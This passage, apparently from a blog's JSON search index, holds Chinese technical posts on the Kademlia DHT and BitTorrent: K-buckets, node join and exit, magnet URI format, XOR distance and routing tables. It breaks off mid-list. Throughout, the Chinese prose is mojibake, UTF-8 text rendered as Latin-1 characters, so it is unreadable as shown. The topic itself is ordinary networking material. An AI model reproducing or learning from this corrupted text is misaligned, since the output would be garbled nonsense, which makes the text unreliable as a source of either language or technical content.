`ä¸»åŠ¨æ”¶é›†èŠ‚ç‚¹`ã€€\t\tã€€\n\t\t\n\t\tä»»ä½•èŠ‚ç‚¹éƒ½å¯ä»¥ä¸»åŠ¨å‘èµ·â€œæŸ¥è¯¢èŠ‚ç‚¹â€çš„è¯·æ±‚ï¼ˆå¯¹åº”äºåè®®ç±»å‹ FIND_NODEï¼‰ï¼Œä»è€Œåˆ·æ–° K æ¡¶ä¸­çš„èŠ‚ç‚¹ä¿¡æ¯\n\t\t\n\t+ `è¢«åŠ¨æ”¶é›†èŠ‚ç‚¹`\n\n\t\tå¦‚æœæ”¶åˆ°å…¶å®ƒèŠ‚ç‚¹å‘æ¥çš„è¯·æ±‚ï¼ˆåè®®ç±»å‹ FIND_NODE æˆ– FIND_VALUEï¼‰ï¼Œä¼šæŠŠå¯¹æ–¹çš„ ID åŠ å…¥è‡ªå·±çš„æŸä¸ª K æ¡¶ä¸­ã€‚ \n\t\t\n\t+ `æ¢æµ‹å¤±æ•ˆèŠ‚ç‚¹`\n\t\n\t\tKad è¿˜æ˜¯æ”¯æŒä¸€ç§æ¢æµ‹æœºåˆ¶ï¼ˆåè®®ç±»å‹ PINGï¼‰ï¼Œå¯ä»¥åˆ¤æ–­æŸä¸ª ID çš„èŠ‚ç‚¹æ˜¯å¦åœ¨çº¿ã€‚å› æ­¤å°±å¯ä»¥å®šæœŸæ¢æµ‹è·¯ç”±è¡¨ä¸­çš„æ¯ä¸€ä¸ªèŠ‚ç‚¹ï¼Œç„¶åæŠŠä¸‹çº¿çš„èŠ‚ç‚¹ä»è·¯ç”±è¡¨ä¸­å¹²æ‰ã€‚\n\n\n+ â€œå¹¶å‘è¯·æ±‚â€ä¸â€œÎ± å‚æ•°â€\n\n\tâ€œKæ¡¶â€çš„è¿™ä¸ªè®¾è®¡æ€è·¯ã€å¤©ç”Ÿæ”¯æŒå¹¶å‘ã€‘ã€‚å› ä¸ºã€åŒä¸€ä¸ªã€‘â€œKæ¡¶â€ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½æ˜¯å¹³ç­‰çš„ï¼Œæ²¡æœ‰å“ªä¸ªæ›´ç‰¹æ®Šï¼›è€Œä¸”å¯¹ã€åŒä¸€ä¸ªã€‘â€œKæ¡¶â€ä¸­çš„èŠ‚ç‚¹å‘èµ·è¯·æ±‚ï¼Œäº’ç›¸ä¹‹é—´æ²¡æœ‰å½±å“ï¼ˆæ— è€¦åˆï¼‰ã€‚\n\t\n\tæ‰€ä»¥ Kad åè®®è¿˜å¼•å…¥äº†ä¸€ä¸ªâ€œÎ± å‚æ•°â€ï¼Œé»˜è®¤è®¾ç½®ä¸º 3ï¼Œä½¿ç”¨ Kad çš„è½¯ä»¶å¯ä»¥åœ¨å…·ä½“ä½¿ç”¨åœºæ™¯ä¸­è°ƒæ•´è¿™ä¸ª Î± å› å­ã€‚\n\t\n\tå½“éœ€è¦è·¯ç”±åˆ°æŸä¸ªâ€œå­æ ‘â€ï¼Œä¼šä»è¯¥å­æ ‘å¯¹åº”çš„â€œKæ¡¶â€ä¸­æŒ‘é€‰ã€Î± ä¸ªèŠ‚ç‚¹ã€‘ï¼Œç„¶åå¯¹è¿™å‡ ä¸ªèŠ‚ç‚¹ã€åŒæ—¶ã€‘å‘å‡ºè¯·æ±‚ã€‚è¿™ä¹ˆåšæœ‰å•¥å¥½å¤„æï¼Ÿä¿ºåœ¨æœ¬æ–‡æœ«å°¾èŠâ€œæ€§èƒ½â€å’Œâ€œå®‰å…¨æ€§â€æ—¶ä¼šå…·ä½“ä»‹ç»ã€‚\n\t\n+ èŠ‚ç‚¹çš„åŠ å…¥\n\t\n\t- ä»»ä½•ä¸€ä¸ªæ–°æ¥çš„èŠ‚ç‚¹ï¼ˆå‡è®¾å« Aï¼‰ï¼Œéœ€è¦å…ˆè·Ÿ DHT ä¸­å·²æœ‰çš„ä»»ä¸€èŠ‚ç‚¹ï¼ˆå‡è®¾å« Bï¼‰å»ºç«‹è¿æ¥ã€‚\n\t- A éšæœºç”Ÿæˆä¸€ä¸ªæ•£åˆ—å€¼ä½œä¸ºè‡ªå·±çš„ IDï¼ˆå¯¹äºè¶³å¤Ÿå¤§çš„æ•£åˆ—å€¼ç©ºé—´ï¼ŒID ç›¸åŒçš„æ¦‚ç‡å¿½ç•¥ä¸è®¡ï¼‰\n\t- A å‘ B å‘èµ·ä¸€ä¸ªæŸ¥è¯¢è¯·æ±‚ï¼ˆåè®®ç±»å‹ FIND_NODEï¼‰ï¼Œè¯·æ±‚çš„ ID æ˜¯è‡ªå·±ï¼ˆé€šä¿—åœ°è¯´ï¼Œå°±æ˜¯æŸ¥è¯¢è‡ªå·±ï¼‰\n\t- B æ”¶åˆ°è¯¥è¯·æ±‚ä¹‹åï¼Œï¼ˆå¦‚å‰é¢æ‰€è¯´ï¼‰ä¼šå…ˆæŠŠ A çš„ ID åŠ å…¥è‡ªå·±çš„æŸä¸ª K æ¡¶ä¸­ã€‚ç„¶åï¼Œæ ¹æ® FIND_NODE åè®®çš„çº¦å®šï¼ŒB ä¼šæ‰¾åˆ°ã€Kä¸ªã€‘æœ€æ¥è¿‘ A çš„èŠ‚ç‚¹ï¼Œå¹¶è¿”å›ç»™ Aã€‚ï¼ˆB æ€ä¹ˆçŸ¥é“å“ªäº›èŠ‚ç‚¹æ¥è¿‘ A æï¼Ÿè¿™æ—¶å€™ï¼Œã€ç”¨ XOR è¡¨ç¤ºè·ç¦»ã€‘çš„ç®—æ³•å°±å‘æŒ¥ä½œç”¨å•¦ï¼‰\n\t- A æ”¶åˆ°è¿™ K ä¸ªèŠ‚ç‚¹çš„ ID ä¹‹åï¼Œï¼ˆä»…ä»…æ ¹æ®è¿™æ‰¹ ID çš„å€¼ï¼‰å°±å¯ä»¥å¼€å§‹åˆå§‹åŒ–è‡ªå·±çš„ K æ¡¶ã€‚\n\t- ç„¶å A ä¼šç»§ç»­å‘åˆšåˆšæ‹¿åˆ°çš„è¿™æ‰¹èŠ‚ç‚¹å‘é€æŸ¥è¯¢è¯·æ±‚ï¼ˆåè®®ç±»å‹ FIND_NODEï¼‰ï¼Œå¦‚æ­¤å¾€å¤ï¼ˆé€’å½’ï¼‰ï¼Œç›´è‡³ A å»ºç«‹äº†è¶³å¤Ÿè¯¦ç»†çš„è·¯ç”±è¡¨ã€‚\n\n+ èŠ‚ç‚¹çš„é€€å‡º\n\t\n\tä¸ Chord ä¸åŒï¼ŒKad å¯¹äºèŠ‚ç‚¹é€€å‡ºæ²¡æœ‰é¢å¤–çš„è¦æ±‚ï¼ˆæ²¡æœ‰â€œä¸»åŠ¨é€€å‡ºâ€çš„è¯´æ³•ï¼‰ã€‚\nã€€ã€€æ‰€ä»¥ï¼ŒKad çš„èŠ‚ç‚¹æƒ³ç¦»å¼€ DHT ç½‘ç»œä¸éœ€è¦ä»»ä½•æ“ä½œï¼ˆå¥—ç”¨å¾å¿—æ‘©çš„åè¨€ï¼šæ‚„æ‚„çš„æˆ‘èµ°äº†ï¼Œæ­£å¦‚æˆ‘æ‚„æ‚„çš„æ¥ï¼‰\n\n\n\n### 5. å‚è€ƒèµ„æ–™\n\n+ https://colobu.com/2018/03/26/distributed-hash-table/\n+ https://program-think.blogspot.com/2017/09/Introduction-DHT-Kademlia-Chord.html\n\n","tags":["dht"],"categories":["BitTorrent"]},{"title":"Kademlia_DHT_KRPC_BitTorrentåè®®","url":"%2Fp%2F1ea24e2a.html","content":"\n# 0.å¼•è¨€\n\nå¹³å¸¸æˆ‘ä»¬é«˜ç«¯ç”¨æˆ·éƒ½ä¼šç”¨åˆ°BTå·¥å…·æ¥åˆ†äº«ä¸€äº›å¥½ç©çš„èµ„æºï¼Œä¾‹å¦‚ubuntu 13.04çš„ISOå®‰è£…ç›˜ï¼Œä¸€äº›å¥½å¬çš„éŸ³ä¹ç­‰ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬ä¼šè¿›å…¥ä¸€ä¸ªå«åšP2Pçš„ç½‘ç»œï¼Œå¤§å®¶éƒ½åœ¨è¿™ä¸ªç½‘ç»œé‡Œäº’ç›¸ä¼ é€’æ•°æ®ï¼Œè¿™ç§åˆ†å¸ƒå¼çš„æ•°æ®ä¼ è¾“è§£å†³äº†HTTPã€FTPç­‰å•ä¸€æœåŠ¡å™¨çš„å¸¦å®½å‹åŠ›ã€‚ä»¥å¾€çš„BTå·¥å…·ï¼ˆåŒ…æ‹¬ç°åœ¨ä¹Ÿæœ‰ï¼‰åœ¨åŠ å…¥è¿™ä¸ªP2Pç½‘ç»œçš„æ—¶å€™éƒ½éœ€è¦å€ŸåŠ©ä¸€ä¸ªå«Trackerçš„ä¸­å¿ƒæœåŠ¡å™¨ï¼Œè¿™ä¸ªæœåŠ¡å™¨æ˜¯ç”¨æ¥ç™»è®°æœ‰å“ªäº›ç”¨æˆ·åœ¨è¯·æ±‚å“ªäº›èµ„æºï¼Œç„¶åè®©è¯·æ±‚åŒä¸€ä¸ªèµ„æºçš„ç”¨æˆ·éƒ½é›†ä¸­åœ¨ä¸€èµ·äº’ç›¸åˆ†äº«æ•°æ®ï¼Œå½¢æˆçš„ä¸€ä¸ªé›†ç¾¤å«åšSwarmã€‚\n\nè¿™ç§å·¥ä½œæ–¹å¼æœ‰ä¸€ä¸ªå¼Šç«¯å°±æ˜¯ä¸€æ—¦TrackeræœåŠ¡å™¨å‡ºç°æ•…éšœæˆ–è€…çº¿è·¯é­åˆ°å±è”½ï¼ŒBTå·¥å…·å°±æ— æ³•æ­£å¸¸å·¥ä½œäº†ã€‚æ‰€ä»¥èªæ˜çš„äººç±»åæ¥å‘æ˜äº†ä¸€ç§å«åšDHTï¼ˆDistributed Hash Tableï¼‰çš„å»ä¸­å¿ƒåŒ–ç½‘ç»œã€‚æ¯ä¸ªåŠ å…¥è¿™ä¸ªDHTç½‘ç»œçš„äººéƒ½è¦è´Ÿè´£å­˜å‚¨è¿™ä¸ªç½‘ç»œé‡Œçš„èµ„æºä¿¡æ¯å’Œå…¶ä»–æˆå‘˜çš„è”ç³»ä¿¡æ¯ï¼Œç›¸å½“äºæ‰€æœ‰äººä¸€èµ·æ„æˆäº†ä¸€ä¸ªåºå¤§çš„åˆ†å¸ƒå¼å­˜å‚¨æ•°æ®åº“ã€‚åœ¨DHTé‡Œå®šä½ä¸€ä¸ªç”¨æˆ·å’Œå®šä½ä¸€ä¸ªèµ„æºçš„æ–¹æ³•æ˜¯ä¸€æ ·çš„ï¼Œä»–ä»¬éƒ½ä½¿ç”¨SHAï¼1äº§ç”Ÿçš„å“ˆå¸Œå€¼æ¥ä½œæ ‡è¯†ã€‚\n\n\n### 0x1: Kademlia/DHT/KRPC/BitTorrentä¹‹é—´çš„å…³ç³»\n\nKademliaæ˜¯ä¸€ä¸ªæœ€åˆæå‡ºçš„æ¡†æ¶å’Œç†è®ºåŸºç¡€ï¼ŒP2På¯¹ç­‰èµ„æºå…±äº«çš„æ€æƒ³ä»è¿™é‡Œå¼€å§‹è¡ç”Ÿï¼ŒDHTå’ŒKRPCæ˜¯åœ¨Kademliaçš„åŸºç¡€ä¸Šè¿›è¡Œäº†åŒ…è£…å’Œå‘å±•ï¼ŒBitTorrentæ˜¯åœ¨è¿™ä¸‰è€…ä¹‹ä¸Šçš„æ–‡ä»¶å…±äº«åˆ†å‘åè®®ã€‚\n\n<!-- more -->\n\n### 0x2: Magnet URIæ ¼å¼\n\n```\nmagnet:?xt=urn:btih:<info-hash>&dn=<name>&tr=<tracker-url>\n\n1. <info-hash>: Infohashçš„16è¿›åˆ¶ç¼–ç ï¼Œå…±40å­—ç¬¦ã€‚ä¸ºäº†ä¸å…¶å®ƒçš„ç¼–ç å…¼å®¹ï¼Œå®¢æˆ·ç«¯åº”å½“ä¹Ÿæ”¯æŒ32å­—ç¬¦çš„infohash base32ç¼–ç  \n2. Xtæ˜¯å”¯ä¸€å¼ºåˆ¶çš„å‚æ•°\n3. dnæ˜¯åœ¨ç­‰å¾…metadataæ—¶å¯èƒ½ä¾›å®¢æˆ·ç«¯æ˜¾ç¤ºçš„åå­—\n4. å¦‚æœåªæœ‰ä¸€ä¸ªå­—æ®µï¼ŒTræ˜¯trackerçš„urlï¼Œå¦‚æœæœ‰å¾ˆå¤šçš„trackerï¼Œé‚£ä¹ˆå¤šä¸ªtrå­—æ®µä¼šè¢«åŒ…å«è¿›å» \n# dnå’Œtréƒ½æ˜¯å¯é€‰çš„ \n```\nå¦‚æœæ²¡æœ‰æŒ‡å®štrackerï¼Œå®¢æˆ·ç«¯åº”ä½¿ç”¨DHTæ¥è·å–peers\n\n\n### 0x3:P2Pçš„å«ä¹‰\n\nä»ç¬¬ä¸€ä¸ªP2Påº”ç”¨ç³»ç»ŸNapsterçš„å‡ºç°å¼€å§‹ï¼ŒP2PæŠ€æœ¯æ€èµ·çš„é£æš´ä¸ºäº’è”ç½‘å¸¦æ¥äº†ä¸€åœºç©ºå‰çš„å˜é©ã€‚P2Pä¸æ˜¯ä¸€ä¸ªå…¨æ–°çš„æ¦‚å¿µï¼ŒP2Pç†å¿µçš„èµ·æºå¯ä»¥è¿½æº¯åˆ°20ä¸–çºª80å¹´ä»£ã€‚ç›®å‰ï¼Œåœ¨å­¦æœ¯ç•Œã€å·¥ä¸šç•Œå¯¹äºP2Pæ²¡æœ‰ä¸€ä¸ªç»Ÿä¸€çš„å®šä¹‰ã€‚Peeråœ¨è‹±è¯­é‡Œæœ‰â€œ(åœ°ä½ã€èƒ½åŠ›ç­‰)åŒç­‰è€…â€ã€â€œåŒäº‹â€å’Œâ€œä¼™ä¼´â€ç­‰æ„ä¹‰ï¼Œè¿™æ ·ä¸€æ¥ï¼ŒP2Pä¹Ÿå°±å¯ä»¥ç†è§£ä¸ºâ€œä¼™ä¼´å¯¹ä¼™ä¼´â€çš„æ„æ€ï¼Œæˆ–ç§°ä¸ºå¯¹ç­‰ç½‘ \n\nä¸¥æ ¼åœ°å®šä¹‰çº¯ç²¹çš„P2Pç½‘ç»œï¼Œå®ƒæ˜¯æŒ‡å®Œå…¨åˆ†å¸ƒçš„ç³»ç»Ÿï¼Œæ¯ä¸€ä¸ªèŠ‚ç‚¹éƒ½æ˜¯åœ¨åŠŸèƒ½ä¸Šå’Œä»»åŠ¡ä¸Šå®Œå…¨ç›¸åŒçš„ã€‚ä½†æ˜¯è¿™æ ·çš„å®šä¹‰å°±ä¼šæ’é™¤æ‰ä¸€äº›ä½¿ç”¨â€œè¶…çº§èŠ‚ç‚¹â€çš„ç³»ç»Ÿæˆ–è€…ä¸€äº›ä½¿ç”¨ä¸­å¤®æœåŠ¡å™¨åšä¸€äº›éæ ¸å¿ƒä»»åŠ¡çš„ç³»ç»Ÿã€‚å¹¿ä¹‰çš„å®šä¹‰é‡Œé¢æŒ‡å‡ºP2Pæ˜¯ä¸€ç§èƒ½å–„äºåˆ©ç”¨äº’è”ç½‘ä¸Šçš„å­˜å‚¨ã€CPUå‘¨æœŸã€å†…å®¹å’Œç”¨æˆ·æ´»åŠ¨ç­‰å„ç§èµ„æºçš„ä¸€ç±»åº”ç”¨ç¨‹åº[3]ï¼ŒåŒ…æ‹¬äº†ä¸€äº›ä¾èµ–ä¸­å¤®æœåŠ¡å™¨æ‰èƒ½å·¥ä½œçš„ç³»ç»Ÿ \n\nP2Pè¿™ä¸ªå®šä¹‰å¹¶ä¸æ˜¯ä»ç³»ç»Ÿçš„ç»“æ„æˆ–è€…å†…éƒ¨çš„æ“ä½œç‰¹å¾å‡ºå‘è€ƒè™‘çš„ï¼Œè€Œæ˜¯ä»äººä»¬å¤–åœ¨çš„æ„ŸçŸ¥è§’åº¦å‡ºå‘ï¼Œå¦‚æœä¸€ä¸ªç³»ç»Ÿä»ç›´è§‚ä¸Šçœ‹æ˜¯å„ä¸ªè®¡ç®—æœºä¹‹é—´ç›´æ¥äº’ç›¸è”ç³»çš„å°±å¯ä»¥è¢«å«åšP2Pã€‚å½“å‰ï¼ŒæŠ€æœ¯ä¸Šæ¯”è¾ƒæƒå¨çš„å®šä¹‰ä¸ºï¼ŒP2Pç³»ç»Ÿæ˜¯ä¸€ä¸ªç”±ç›´æ¥ç›¸è¿çš„èŠ‚ç‚¹ä»¬æ‰€æ„æˆçš„åˆ†å¸ƒå¼çš„ç³»ç»Ÿ[4]ï¼Œè¿™äº›èŠ‚ç‚¹èƒ½å¤Ÿä¸ºäº†å…±äº«å†…å®¹ã€CPU æ—¶é—´ã€å­˜å‚¨æˆ–è€…å¸¦å®½ç­‰èµ„æºè€Œè‡ªæˆ‘å½¢æˆä¸€å®šçš„ç½‘ç»œæ‹“æ‰‘ç»“æ„ï¼Œèƒ½å¤Ÿåœ¨é€‚åº”èŠ‚ç‚¹æ•°ç›®çš„å˜åŒ–å’Œå¤±æ•ˆçš„åŒæ—¶ç»´æŒå¯ä»¥æ¥å—çš„é“¾æ¥èƒ½åŠ›å’Œæ€§èƒ½ï¼Œå¹¶ä¸”ä¸éœ€è¦ä¸€ä¸ªå…¨å±€æœåŠ¡å™¨æˆ–è€…æƒå¨çš„ä¸­ä»‹çš„æ”¯æŒã€‚æœ¬æ–‡ä»äººä»¬æ„ŸçŸ¥çš„è§’åº¦å‡ºå‘ï¼Œé‡‡ç”¨P2Pçš„å¹¿ä¹‰å®šä¹‰\n\n\n# 1. Kademliaåè®®\n\n### 0x1: Kademlia\n\nKademliaæ˜¯ä¸€ç§é€šè¿‡åˆ†æ•£å¼æ‚å‡‘è¡¨å®ç°çš„åè®®ç®—æ³•ï¼Œå®ƒæ˜¯ç”±Petarå’ŒDavidä¸ºéé›†ä¸­å¼P2Pè®¡ç®—æœºç½‘ç»œè€Œè®¾è®¡çš„\n\n```\n1. Kademliaè§„å®šäº†ç½‘ç»œçš„ç»“æ„ï¼Œä¹Ÿè§„å®šäº†é€šè¿‡èŠ‚ç‚¹æŸ¥è¯¢è¿›è¡Œä¿¡æ¯äº¤æ¢çš„æ–¹å¼\n2. Kademliaç½‘ç»œèŠ‚ç‚¹ä¹‹é—´ä½¿ç”¨UDPè¿›è¡Œé€šè®¯\n3. å‚ä¸é€šè®¯çš„æ‰€æœ‰èŠ‚ç‚¹å½¢æˆä¸€å¼ è™šæ‹Ÿç½‘(æˆ–è€…å«åšè¦†ç›–ç½‘)ã€‚è¿™äº›èŠ‚ç‚¹é€šè¿‡ä¸€ç»„æ•°å­—(æˆ–ç§°ä¸ºèŠ‚ç‚¹ID)æ¥è¿›è¡Œèº«ä»½æ ‡è¯†\n4. èŠ‚ç‚¹IDä¸ä»…å¯ä»¥ç”¨æ¥åšèº«ä»½æ ‡è¯†ï¼Œè¿˜å¯ä»¥ç”¨æ¥è¿›è¡Œå€¼å®šä½(å€¼é€šå¸¸æ˜¯æ–‡ä»¶çš„æ•£åˆ—æˆ–è€…å…³é”®è¯)\n5. <font color=red>å…¶å®ï¼ŒèŠ‚ç‚¹IDä¸æ–‡ä»¶æ•£åˆ—ç›´æ¥å¯¹åº”ï¼Œå®ƒæ‰€è¡¨ç¤ºçš„é‚£ä¸ªèŠ‚ç‚¹å­˜å‚¨ç€å“ªå„¿èƒ½å¤Ÿè·å–æ–‡ä»¶å’Œèµ„æºçš„ç›¸å…³ä¿¡æ¯</font>\n6. å½“æˆ‘ä»¬åœ¨ç½‘ç»œä¸­æœç´¢æŸäº›å€¼(å³é€šå¸¸æœç´¢å­˜å‚¨æ–‡ä»¶æ•£åˆ—æˆ–å…³é”®è¯çš„èŠ‚ç‚¹)çš„æ—¶å€™ï¼ŒKademliaç®—æ³•éœ€è¦çŸ¥é“ä¸è¿™äº›å€¼ç›¸å…³çš„é”®ï¼Œç„¶ååˆ†æ­¥åœ¨ç½‘ç»œä¸­å¼€å§‹æœç´¢ã€‚æ¯ä¸€æ­¥éƒ½ä¼šæ‰¾åˆ°ä¸€äº›èŠ‚ç‚¹ï¼Œè¿™äº›èŠ‚ç‚¹çš„IDä¸é”®æ›´ä¸ºæ¥è¿‘ï¼Œå¦‚æœæœ‰èŠ‚ç‚¹ç›´æ¥è¿”å›æœç´¢çš„å€¼æˆ–è€…å†ä¹Ÿæ— æ³•æ‰¾åˆ°ä¸é”®æ›´ä¸ºæ¥è¿‘çš„èŠ‚ç‚¹IDçš„æ—¶å€™æœç´¢ä¾¿ä¼šåœæ­¢ã€‚è¿™ç§æœç´¢å€¼çš„æ–¹æ³•æ˜¯éå¸¸é«˜æ•ˆçš„\n7. ä¸å…¶ä»–çš„åˆ†æ•£å¼æ‚å‡‘è¡¨çš„å®ç°ç±»ä¼¼ï¼Œåœ¨ä¸€ä¸ªåŒ…å«nä¸ªèŠ‚ç‚¹çš„ç³»ç»Ÿçš„å€¼çš„æœç´¢ä¸­ï¼ŒKademliaä»…è®¿é—®O(log(n))ä¸ªèŠ‚ç‚¹ã€‚éé›†ä¸­å¼ç½‘ç»œç»“æ„è¿˜æœ‰æ›´å¤§çš„ä¼˜åŠ¿ï¼Œé‚£å°±æ˜¯å®ƒèƒ½å¤Ÿæ˜¾è‘—å¢å¼ºæŠµå¾¡æ‹’ç»æœåŠ¡æ”»å‡»çš„èƒ½åŠ›ã€‚å³ä½¿ç½‘ç»œä¸­çš„ä¸€æ•´æ‰¹èŠ‚ç‚¹é­å—æ³›æ´ªæ”»å‡»ï¼Œä¹Ÿä¸ä¼šå¯¹ç½‘ç»œçš„å¯ç”¨æ€§é€ æˆå¾ˆå¤§çš„å½±å“ï¼Œé€šè¿‡ç»•è¿‡è¿™äº›æ¼æ´(è¢«æ”»å‡»çš„èŠ‚ç‚¹)æ¥é‡æ–°ç¼–ç»‡ä¸€å¼ ç½‘ç»œï¼Œç½‘ç»œçš„å¯ç”¨æ€§å°±å¯ä»¥å¾—åˆ°æ¢å¤ \n```\n\n### 0x2: p2pç½‘ç»œæ¶æ„æ¼”è¿›\n\n```\n1. ç¬¬ä¸€ä»£P2Pæ–‡ä»¶åˆ†äº«ç½‘ç»œï¼ŒåƒNapsterï¼Œä¾èµ–äºä¸­å¤®æ•°æ®åº“æ¥åè°ƒç½‘ç»œä¸­çš„æŸ¥è¯¢\n2. ç¬¬äºŒä»£P2Pç½‘ç»œï¼ŒåƒGnutellaï¼Œä½¿ç”¨æ³›æ»¥å¼æŸ¥è¯¢(query flooding)æ¥æŸ¥è¯¢æ–‡ä»¶ï¼Œå®ƒä¼šæœç´¢ç½‘ç»œä¸­çš„æ‰€æœ‰èŠ‚ç‚¹\n3. ç¬¬ä¸‰ä»£p2pç½‘ç»œä½¿ç”¨åˆ†æ•£å¼æ‚å‡‘è¡¨æ¥æŸ¥è¯¢ç½‘ç»œä¸­çš„æ–‡ä»¶ï¼Œåˆ†æ•£å¼æ‚å‡‘è¡¨åœ¨æ•´ä¸ªç½‘ç»œä¸­å‚¨å­˜èµ„æºçš„ä½ç½®\n```\n\nè¿™äº›åè®®è¿½æ±‚çš„ä¸»è¦ç›®æ ‡å°±æ˜¯å¿«é€Ÿå®šä½æœŸæœ›çš„èŠ‚ç‚¹ã€‚KademliaåŸºäºä¸¤ä¸ªèŠ‚ç‚¹ä¹‹é—´çš„è·ç¦»è®¡ç®—ï¼Œè¯¥è·ç¦»æ˜¯\"ä¸¤ä¸ªç½‘ç»œèŠ‚ç‚¹IDå·çš„å¼‚æˆ–\"ï¼Œè®¡ç®—çš„ç»“æœæœ€ç»ˆä½œä¸ºæ•´å‹æ•°å€¼è¿”å›ã€‚å…³é”®å­—å’ŒèŠ‚ç‚¹IDæœ‰åŒæ ·çš„æ ¼å¼å’Œé•¿åº¦ï¼Œå› æ­¤ï¼Œå¯ä»¥ä½¿ç”¨åŒæ ·çš„æ–¹æ³•è®¡ç®—å…³é”®å­—å’ŒèŠ‚ç‚¹IDä¹‹é—´çš„è·ç¦»ã€‚èŠ‚ç‚¹IDä¸€èˆ¬æ˜¯ä¸€ä¸ªå¤§çš„éšæœºæ•°ï¼Œé€‰æ‹©è¯¥æ•°çš„æ—¶å€™æ‰€è¿½æ±‚çš„ä¸€ä¸ªç›®æ ‡å°±æ˜¯å®ƒçš„å”¯ä¸€æ€§(å¸Œæœ›åœ¨æ•´ä¸ªç½‘ç»œä¸­è¯¥èŠ‚ç‚¹IDæ˜¯å”¯ä¸€çš„)ã€‚å¼‚æˆ–è·ç¦»è·Ÿå®é™…ä¸Šçš„åœ°ç†ä½ç½®æ²¡æœ‰ä»»ä½•å…³ç³»ï¼Œåªä¸IDç›¸å…³ã€‚å› æ­¤å¾ˆå¯èƒ½æ¥è‡ªå¾·å›½å’Œæ¾³å¤§åˆ©äºšçš„èŠ‚ç‚¹ç”±äºé€‰æ‹©äº†ç›¸ä¼¼çš„éšæœºIDè€Œæˆä¸ºé‚»å±…ã€‚é€‰æ‹©å¼‚æˆ–æ˜¯å› ä¸ºé€šè¿‡å®ƒè®¡ç®—çš„è·ç¦»äº«æœ‰å‡ ä½•è·ç¦»å…¬å¼çš„ä¸€äº›ç‰¹å¾ï¼Œå°¤å…¶ä½“ç°åœ¨ä»¥ä¸‹å‡ ç‚¹\n\n```\n1. èŠ‚ç‚¹å’Œå®ƒæœ¬èº«ä¹‹é—´çš„å¼‚æˆ–è·ç¦»æ˜¯0\n2. å¼‚æˆ–è·ç¦»æ˜¯å¯¹ç§°çš„ï¼šå³ä»Aåˆ°Bçš„å¼‚æˆ–è·ç¦»ä¸ä»Båˆ°Açš„å¼‚æˆ–è·ç¦»æ˜¯ç­‰åŒçš„\n3. å¼‚æˆ–è·ç¦»ç¬¦åˆä¸‰è§’ä¸ç­‰å¼: ä¸‰ä¸ªé¡¶ç‚¹A B Cï¼ŒACå¼‚æˆ–è·ç¦»å°äºæˆ–ç­‰äºABå¼‚æˆ–è·ç¦»å’ŒBCå¼‚æˆ–è·ç¦»ä¹‹å’Œï¼Œè¿™ç§å‡ ä½•æ•°å­¦ç‰¹å¾ï¼Œå¯ä»¥å¾ˆå¥½çš„æ”¯æ’‘ç®—æ³•è¿›è¡Œå¯»è·¯è·¯ç”±\n```\n\nç”±äºä»¥ä¸Šçš„è¿™äº›å±æ€§ï¼Œåœ¨å®é™…çš„èŠ‚ç‚¹è·ç¦»çš„åº¦é‡è¿‡ç¨‹ä¸­è®¡ç®—é‡å°†å¤§å¤§é™ä½ã€‚Kademliaæœç´¢çš„æ¯ä¸€æ¬¡è¿­ä»£å°†è·ç›®æ ‡è‡³å°‘æ›´è¿‘1 bit(æ¯æ¬¡æ ¹æ®XORç»“æœï¼Œå¾€å‰é€‰æ‹©1bitæ›´è¿‘çš„èŠ‚ç‚¹)ã€‚ä¸€ä¸ªåŸºæœ¬çš„å…·æœ‰2çš„næ¬¡æ–¹ä¸ªèŠ‚ç‚¹çš„Kademliaç½‘ç»œåœ¨æœ€åçš„æƒ…å†µä¸‹åªéœ€èŠ±næ­¥å°±å¯æ‰¾åˆ°è¢«æœç´¢çš„èŠ‚ç‚¹æˆ–å€¼\n\n\n>å› ä¸ºKademliaæ˜¯æ ¹æ®bitä½XORè®¡ç®—å¾—åˆ°\"ç›¸å¯¹è·ç¦»\"çš„ï¼Œå¯¹äºè¶Šä½bitä½ï¼ŒXORå¯èƒ½å¾—åˆ°çš„ç»“æœè¶Šå°ï¼Œå¯¹äºè¶Šé«˜ä½çš„bitä½ï¼ŒXORå¯èƒ½å¾—åˆ°çš„å€¼å°±è¶Šå¤§ï¼Œå¹¶ä¸”æ˜¯å‘ˆç°2çš„æŒ‡æ•°æ–¹å¼å¢é•¿çš„ï¼Œæ‰€ä»¥ï¼Œä»æ•°å­¦ä¸Šæ¥è¯´ï¼Œä¸€ä¸ªDHTç½‘ç»œä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ï¼Œé€šè¿‡è¿™ç§æ–¹å¼(XORè·ç¦»)è¿›è¡Œå¯»å€ï¼Œæ¯æ¬¡å‰è¿›ä¸€ä¸ªbitï¼Œæœ€å¤§åªéœ€è¦log2Næ¬¡å³å¯åˆ°è¾¾ç›®æ ‡èŠ‚ç‚¹(log2é€¼è¿‘çš„æ€è·¯ï¼Œå³bit 2å¯ä»¥è¡¨ç¤ºä¸–ç•Œä¸Šä»»ä½•æ•°å­—)\n\n### 0x3: è·¯ç”±è¡¨(å°±æ˜¯Kæ¡¶,å­˜æ”¾ç«¯å£)\n\nKademliaè·¯ç”±è¡¨ç”±å¤šä¸ªåˆ—è¡¨ç»„æˆï¼Œ<font color=red>æ¯ä¸ªåˆ—è¡¨å¯¹åº”èŠ‚ç‚¹IDçš„ä¸€ä½(ä¾‹å¦‚: å‡å¦‚èŠ‚ç‚¹IDå…±æœ‰6ä½ï¼Œåˆ™èŠ‚ç‚¹çš„è·¯ç”±è¡¨å°†åŒ…å«6ä¸ªåˆ—è¡¨)ï¼Œ</font><font color=green>ä¸€ä¸ªåˆ—è¡¨ä¸­åŒ…å«å¤šä¸ªæ¡ç›®ï¼Œæ¡ç›®ä¸­åŒ…å«å®šä½å…¶ä»–èŠ‚ç‚¹æ‰€å¿…è¦çš„ä¸€äº›æ•°æ®ã€‚åˆ—è¡¨æ¡ç›®ä¸­çš„è¿™äº›æ•°æ®é€šå¸¸æ˜¯ç”±å…¶ä»–èŠ‚ç‚¹çš„IPåœ°å€ï¼Œç«¯å£å’ŒèŠ‚ç‚¹IDç»„æˆã€‚</font>è¿™é‡Œä»”ç»†æ€è€ƒä¸€ä¸‹\n\n\n1. èŠ‚ç‚¹IDçš„ä¸€ä½å°±æ˜¯1bitï¼Œå‡è®¾æˆ‘ä»¬çš„èŠ‚ç‚¹IDæ˜¯: 111000\n2. 